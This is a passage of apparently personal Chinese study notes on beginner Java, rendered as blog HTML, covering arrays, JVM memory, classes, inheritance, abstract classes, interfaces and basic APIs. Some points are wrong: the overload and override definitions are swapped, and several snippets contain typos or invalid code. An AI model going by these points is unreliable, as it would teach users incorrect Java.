href="#数组越界异常（ArrayIndexOutOfBoundsException）" class="headerlink" title="数组越界异常（ArrayIndexOutOfBoundsException）"></a>数组越界异常（ArrayIndexOutOfBoundsException）</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] array = <span class="keyword">new</span> String[] &#123;<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>&#125;;</span><br><span class="line">        System.out.println(array[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ArrayIndexOutOfBoundsException: 2</span><br><span class="line">    at cn.itcast.day01.demo01.HelloWorld.main(HelloWorld.java:6)</span><br></pre></td></tr></table></figure><h5 id="空指针异常-NullPointerException"><a href="#空指针异常-NullPointerException" class="headerlink" title="空指针异常(NullPointerException)"></a>空指针异常(NullPointerException)</h5><p>数组必须new初始化才能使用, 如果只是赋值了一个null, 将发生空指针异常:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] array = <span class="keyword">null</span>;</span><br><span class="line">        System.out.println(array[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NullPointerException</span><br><span class="line">    at cn.itcast.day01.demo01.HelloWorld.main(HelloWorld.java:6)</span><br></pre></td></tr></table></figure><h4 id="数组长度"><a href="#数组长度" class="headerlink" title="数组长度"></a>数组长度</h4><ul><li><p>获得: <code>array.length</code></p></li><li><p>数组一旦创建, 程序运行期间, 长度不可改变</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-array-length.jpg" alt="java-array-length"></p></li></ul><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><h4 id="栈-Stack）"><a href="#栈-Stack）" class="headerlink" title="栈(Stack）"></a>栈(Stack）</h4><ul><li>存放方法中的局部变量, 超出作用域立即从栈内存中消失</li></ul><h4 id="堆-Heap"><a href="#堆-Heap" class="headerlink" title="堆(Heap)"></a>堆(Heap)</h4><ul><li>凡是new出来的东西, 都在堆当中</li><li>堆内存里面的东西都有一个地址值:16进制</li><li>堆内的数据都有默认值</li></ul><h4 id="方法区-Method-Area"><a href="#方法区-Method-Area" class="headerlink" title="方法区(Method Area)"></a>方法区(Method Area)</h4><p>存放<code>.class</code>相关信息, 包含方法的信息</p><h4 id="本地方法栈-Native-Method-Stack"><a href="#本地方法栈-Native-Method-Stack" class="headerlink" title="本地方法栈(Native Method Stack)"></a>本地方法栈(Native Method Stack)</h4><p>与操作系统相关</p><h4 id="寄存器（Register）"><a href="#寄存器（Register）" class="headerlink" title="寄存器（Register）"></a>寄存器（Register）</h4><p>与CPU相关</p><h3 id="面向对象的思想"><a href="#面向对象的思想" class="headerlink" title="面向对象的思想"></a>面向对象的思想</h3><ul><li>面向过程, 每一步都亲力亲为</li><li>面向对象, 找一个已有功能帮助实现</li></ul><p>举例:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印格式: [10, 20, 30, 40]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 面向过程</span></span><br><span class="line">        System.out.print(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == array.length - <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(array[i] + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.print(array[i] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 面向对象</span></span><br><span class="line">        System.out.println(Arrays.toString(array));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h3><h4 id="类"><a href="#类" class="headerlink" title="类"></a>类</h4><ul><li><strong>类</strong>:一组相关<strong>属性</strong>和<strong>行为</strong>的集合, 可以看成是一类事物的模板, 使用事物的属性特征和行为特征来描述该类事物。</li></ul><p>现实中, 描述一类事物:</p><ul><li><strong>属性</strong>: 就是该事物的状态信息,- <strong>行为</strong>: 就是该事物能够做什么</li></ul><p>举例: 小猫。</p><ul><li>属性: 名字、体重、年龄、颜色</li><li>行为: 走、跑、叫</li></ul><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><ul><li><strong>对象</strong>: 一类事物的具体体现, 对象是类的一个<strong>实例</strong>, 必然具备该类事物的属性和行为</li></ul><p>举例: 一只小猫</p><h4 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h4><ul><li>类是一类事物的描述, 是<strong>抽象的</strong></li><li>对象是一类事务的实例, 是<strong>具体的</strong></li><li><strong>类是对象的模板, 对象是类的实体</strong></li></ul><h4 id="创建和使用"><a href="#创建和使用" class="headerlink" title="创建和使用"></a>创建和使用</h4><p>感觉和C++有相通之处</p><p>导包, 如果在同一个包内可以不写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名称.类名称</span><br><span class="line"></span><br><span class="line">Student student = <span class="keyword">new</span> Student();</span><br></pre></td></tr></table></figure><p>成员变量没有进行赋值, 呢么将会有一个默认值, 规则和数组一样</p><h4 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h4><h5 id="一个"><a href="#一个" class="headerlink" title="一个"></a>一个</h5><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-class-storage.jpg" alt="java-class-storage"></p><h5 id="两个"><a href="#两个" class="headerlink" title="两个"></a>两个</h5><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-class-storage-2.jpg" alt="java-class-storage-2"></p><h3 id="局部变量和成员变量"><a href="#局部变量和成员变量" class="headerlink" title="局部变量和成员变量"></a>局部变量和成员变量</h3><ul><li>局部变量: 随着方法进栈而诞生, 随着方法出栈而消失</li><li>成员变量:随着对象创建而诞生, 随着对象被垃圾回收而消失</li></ul><h3 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h3><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><ul><li>方法就是一种封装</li><li>关键字<code>private 私有化</code>也是一种封装</li><li>把一些细节信息隐藏, 对外界不可见</li></ul><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><ul><li>继承是多态的前提</li><li>继承类似<code>师徒关系</code>:师傅会多少都无偿传授给徒弟</li><li>继承主要解决的问题是:<code>共性抽取</code>, 举个栗子(滑稽保命), 在一个公司里有很多的员工, 员工属性:姓名, 性别。职称等就是他们的共性, 但根据职称的不同, 每个人的计算工资的方法不一样, 因此可以对<code>员工</code>这个共性进行抽取, 然后对<code>员工</code>类进行继承, 分别实现各自的计算工资的方法。</li><li>通俗讲就是可以免去<code>Ctrl + C/V</code>的麻烦</li><li>被继承的类可以叫做<code>父类</code>、<code>基类</code>、<code>超类</code></li><li>继承的类可以叫做<code>子类</code>、<code>派生类</code></li><li>继承的关键字是<code>extends</code></li></ul><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Parent.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul><li><p>Java是<strong>单继承</strong>, 即只能有一个父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class one</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassOne</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class two</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassTwo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class three 这样定义是错误的!</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassThree</span> <span class="keyword">extends</span> <span class="title">ClassOne</span>, <span class="title">ClassTwo</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Java可以<strong>多级继承</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Parent.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Grandson class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GrandsonClass</span> <span class="keyword">extends</span> <span class="title">ChildClass</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>父类可以拥有多个子类</p></li></ul><h5 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h5><ul><li>如果在继承关系中成员变量, 则创建子类对象是, 访问有两种方式<ul><li>直接通过子类对象访问成员变量</li><li>间接通过成员方法访问成员变量</li></ul></li></ul><h5 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h5><ul><li>就近原则, 谁调用执行谁的成员方法, 没有则<strong>向上</strong>寻找</li></ul><h6 id="重载-Overload"><a href="#重载-Overload" class="headerlink" title="重载(Overload)"></a>重载(Overload)</h6><ul><li>父子类名称相同, 参数列表也相同</li></ul><h6 id="重写-覆盖-Override"><a href="#重写-覆盖-Override" class="headerlink" title="重写/覆盖(Override)"></a>重写/覆盖(Override)</h6><ul><li><p>父子类名称相同, 参数列表不同</p></li><li><p>关键字<code>@Override</code>:可选, 起检测作用, 只要书写正确无也可覆盖</p></li><li><p><strong>返回值</strong>:子类方法返回值<strong>必须小于等于</strong>父类方法的返回值范围, 例如<code>Object</code>是<code>String</code>的父类, 则父类为<code>String</code>则子类不可以是<code>Object</code>, 父类为<code>Object</code>则子类可以是<code>String</code></p></li><li><p><strong>权限</strong>: 子类方法权限<strong>必须大于等于</strong>父类方法的权限修饰符</p><ul><li><code>public &gt; protected &gt; (default) &gt; private</code></li><li><code>defalut</code>: 表示什么都不写, 留空</li></ul></li><li><p>举例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Parent.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Child.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><ul><li>重写, 继承, 重载都是多态的一种表现形式</li></ul><h3 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h3><p>当方法的局部变量和类成员变量重名, 根据<code>就近原则</code>, 优先使用局部变量</p><p>如果需要访问本类当中的成员变量, 需要使用格式;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>, 成员变量</span><br></pre></td></tr></table></figure><p>例子:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-this1.jpg" alt="java-this1"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-this2.jpg" alt="java-this2"></p><p><code>”通过谁调用的方法, 谁就是this“</code>: 用打印地址值来验证</p><h3 id="static-关键字"><a href="#static-关键字" class="headerlink" title="static 关键字"></a>static 关键字</h3><ul><li>感觉跟C++一样, 只写一些自己不懂的</li></ul><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><p>特点:</p><ol><li>当第一次用到本类, 静态代码块执行唯一的一次</li><li>且比构造方法先执行！</li></ol><p>用途:常用于对静态成员的赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名称 </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 静态代码块的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="super-关键字"><a href="#super-关键字" class="headerlink" title="super 关键字"></a>super 关键字</h3><h4 id="构造方法中"><a href="#构造方法中" class="headerlink" title="构造方法中"></a>构造方法中</h4><ul><li><code>super()</code>: 访问父类中的无参构造函数</li><li><code>super(paras...)</code>: 访问父类的有参构造函数</li></ul><h4 id="非构造方法"><a href="#非构造方法" class="headerlink" title="非构造方法"></a>非构造方法</h4><ul><li><code>super.xxx</code>: 访问父类中的成员变量</li><li><code>super.yyy(paras..)</code>: 访问父类中的成员函数yyy</li></ul><h3 id="this-vs-super"><a href="#this-vs-super" class="headerlink" title="this vs super"></a>this vs super</h3><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-super_vs_this.jpg" alt="java-super_vs_this"></p><h3 id="标准类（Java-Bean）"><a href="#标准类（Java-Bean）" class="headerlink" title="标准类（Java Bean）"></a>标准类（Java Bean）</h3><p>一个标准类中通常有</p><ul><li>所有成员变量用<code>private</code>修饰</li><li>每一个成员变量都有一对<code>Getter/Setter</code>方法</li><li>一个无参构造</li><li>一个全参构造</li></ul><h3 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h3><ul><li>只有右边的对象, 没有左边的名字和赋值运算符</li><li>只能使用一次, 下次使用需重新创建</li><li>也可以作为方法的参数和返回值</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常</span></span><br><span class="line">Person one = <span class="keyword">new</span> Person();</span><br><span class="line">one.name = <span class="string">&quot;Lantern&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名对象</span></span><br><span class="line"><span class="keyword">new</span> Person().name = <span class="string">&quot;Lantern2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为参数</span></span><br><span class="line">methodParam(<span class="keyword">new</span> Scanner(System.in));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Scanner <span class="title">methodReturnAndParam</span><span class="params">(Scanner sc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Scanner(Systen.in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person array = <span class="keyword">new</span> Person[<span class="number">3</span>];</span><br><span class="line"><span class="comment">// 初始化为null</span></span><br><span class="line">Person one = <span class="keyword">new</span> Person(<span class="string">&quot;Lantern&quot;</span>, <span class="number">18</span>);</span><br><span class="line"><span class="comment">// 将one中的地址值赋值给数组的0号元素</span></span><br><span class="line">array[<span class="number">0</span>] = one;</span><br></pre></td></tr></table></figure><h3 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h3><ul><li><p>如果父类中的方法不确定如何进行某个方法体实现, 那么这应该是一个<strong>抽象方法</strong></p><ul><li>狗吃骨头猫吃鱼, 但动物吃什么没法具体描述, 那么就是一个抽象方法</li><li>正方形三角形可计算面积, 但是图形怎么计算面积没法具体描述, 那么就是一个抽象方法</li></ul></li></ul><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>  定义<strong>抽象方法</strong>:在返回值前加上<code>abstract</code>关键字, 然后去掉大括号, 直接分号结束</p><p>  定义<strong>抽象类</strong>: 在<code>class</code>之前加上<code>abstract</code>关键字</p><p>  <strong>抽象方法必须在抽象类中</strong></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li>不能直接<code>new</code>抽象类对象, 必须用一个子类来继承抽象父类</li><li>子类<strong>必须</strong>覆盖重写抽象父类当中的所有的抽象方法</li></ul><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Animal.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">normalMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// code。。。。。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Cat.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Cat eat fish.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol><li>抽象类<strong>不能创建对象</strong></li><li>抽象类<strong>可以有</strong>构造方法, 供子类创建对象时, 初始化父类成员<ol><li>先执行父类构造方法</li><li>再执行子类构造方法</li></ol></li><li>抽象类<strong>不一定</strong>包含抽象方法, 有抽象方法<strong>必然</strong>是抽象类</li><li>抽象类的子类, <strong>必须</strong>覆盖重写父类中<strong>所有抽象方法</strong>, 除非子类也是抽象类</li></ol><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><strong>一种公共的规范</strong>, 只要符合标准就可以大家通用</li><li><strong>引用数据类型</strong>, 最重要的内容就是其中的抽象方法</li></ul><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> 接口名称 </span>&#123;</span><br><span class="line">    <span class="comment">// 接口内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="可包含内容"><a href="#可包含内容" class="headerlink" title="可包含内容"></a>可包含内容</h4><ol><li>Java7<ol><li>常量</li><li>抽象方法</li></ol></li><li>Java8, 额外包含<ol><li>默认方法</li><li>静态方法</li></ol></li><li>Java9, 额外包含<ol><li>私有方法</li></ol></li></ol><h4 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h4><h5 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h5><ol><li>接口中的抽象方法修饰符<strong>必须</strong>是:<code>public abstract</code></li><li>这两个关键字<strong>可以</strong>选择性的<strong>省略</strong></li><li>方法的三要素可以随意定义</li></ol><h5 id="定义举例"><a href="#定义举例" class="headerlink" title="定义举例"></a>定义举例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">methodAbs1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">methodAbs2</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methodAbs3</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">methodAbs4</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 以上全是抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><ul><li><p>接口不能直接使用, 必须要有一个<strong>实体类</strong>来实现接口</p></li><li><p>实现类必须覆盖重写接口中的抽象方法, 否则必须为抽象类</p></li><li><p>创建实现类的对象, 进行使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名 <span class="keyword">implements</span> 接口名称 </span>&#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInterfaceImpl</span> <span class="keyword">implements</span> <span class="title">MyInterface</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 覆盖重写接口中的抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="默认方法"><a href="#默认方法" class="headerlink" title="默认方法"></a>默认方法</h4><blockquote><p>从java8开始允许在接口中定义默认方法</p></blockquote><ul><li>解决接口升级问题</li></ul><h5 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">default</span> 返回值类型 方法名称(参数列表) &#123;</span><br><span class="line">    方法体</span><br><span class="line">&#125; <span class="comment">// public 可省略</span></span><br></pre></td></tr></table></figure><h5 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h5><ul><li>接口的默认方法会被实现类继承</li><li>接口的默认方法可以被覆盖重写</li></ul><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><blockquote><p>从java8开始允许在接口中定义静态方法</p></blockquote><h5 id="定义格式-1"><a href="#定义格式-1" class="headerlink" title="定义格式"></a>定义格式</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 返回类型 方法名称(参数列表) &#123;</span><br><span class="line">    方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="成员变量-1"><a href="#成员变量-1" class="headerlink" title="成员变量"></a>成员变量</h4><ul><li>必须使用<strong>public static final</strong>三个关键字修饰(可省略, 默认)</li><li>其实就是接口的<strong>常量</strong>, 一旦赋值不可更改</li><li>必须进行<strong>赋值</strong></li><li>成员变量名建议使用<strong>大写字母</strong>, 符合命名规范</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> 成员变量名 = 值;</span><br></pre></td></tr></table></figure><h4 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li><p>接口没有<strong>静态代码块</strong>或<strong>构造方法</strong></p></li><li><p>一个类的直接父类是唯一的, 但一个类可以实现多个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 实现类名 <span class="keyword">implements</span> 接口1, 接口2 </span>&#123;</span><br><span class="line">    <span class="comment">// 覆写所有抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果实现类所实现的多个接口当中, 存在重复接口, 只用覆写一次</p></li><li><p>如果实现类没有覆盖重写所有接口当中的所有抽象方法, 那么实现类就必须是一个抽象类</p></li><li><p>如果实现类所实现的多个接口当中, 存在重复的默认方法, 那么实现类一定要对冲突的默认方法进行覆写</p></li><li><p>一个类如果直接父类当中的方法, 和接口当中的默认方法产生了冲突, 优先用父类当中的方法</p></li></ol><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><ul><li><p>API<code>(Application Programming Interface)</code></p></li><li><p>Java API 文档</p></li></ul><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><p>一个可以解析基本类型和字符串的简单文本扫描器</p><p>例如, 以下代码使得用户可以从<code>System.in</code>中读取一个数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner; <span class="comment">// 1.导包</span></span><br><span class="line"><span class="comment">// 2.创建, System.in 代表从键盘进行输入, 空格或回车进行截断</span></span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">// 3.使用</span></span><br><span class="line"><span class="keyword">int</span> i = sc.nextInt();  <span class="comment">// 获得一个数字</span></span><br><span class="line">String str = sc.next(); <span class="comment">// 获得一个字符串</span></span><br></pre></td></tr></table></figure><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="计算输入的两数字和"><a href="#计算输入的两数字和" class="headerlink" title="计算输入的两数字和"></a>计算输入的两数字和</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> i = sc.nextInt();</span><br><span class="line"><span class="keyword">int</span> j = sc.nextInt();</span><br><span class="line">System.out.println(i + j);</span><br></pre></td></tr></table></figure><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><p>生成随机数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导包</span></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="comment">// 创建</span></span><br><span class="line">Random r = <span class="keyword">new</span> Random();</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">int</span> num1 = r.nextInt(); <span class="comment">// 无参调用, 全范围</span></span><br><span class="line"><span class="keyword">int</span> num2 = r.nextInt(<span class="number">10</span>); <span class="comment">// 有参调用, [0, 10)</span></span><br></pre></td></tr></table></figure><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><ul><li><p><code>java.util.ArrayList;</code></p></li><li><p><code>ArrayList&lt;E&gt;</code></p><ul><li><p><code>&lt;E&gt;</code>称为泛型, 也就是装在集合当中的所有元素都是统一类型</p></li><li><p>泛型只能是引用类型, 不能是基本类型</p></li></ul></li><li><p>ArrayList集合的长度可以随意改变</p></li><li><p>对于ArrayList集合来说, 直接打印得到的不是地址值, 而是内容</p></li><li><p>如果内容为空, 得到的是空的中括号: <code>[]</code></p></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建了一个ArrayList聚合, 集合的名称list, 里面装的全都是String字符串类型的数据</span></span><br><span 